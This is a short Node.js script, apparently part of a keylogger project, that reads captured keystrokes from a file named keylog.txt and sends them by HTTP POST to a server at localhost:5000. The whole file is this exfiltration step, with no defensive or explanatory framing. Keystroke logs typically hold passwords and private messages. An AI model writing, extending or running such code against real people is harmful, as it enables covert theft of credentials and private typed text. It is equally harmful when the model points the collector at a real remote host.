const fs = require('fs');
const axios = require('axios')

let d ;
fs.readFile('./../keylog.txt', 'utf8', async(err, data) => {
    if (err) {
        console.error(err);
        return;
    }
    d = data
    console.log(d)

    await axios.post("http://localhost:5000/",{
        d
    })
    
})


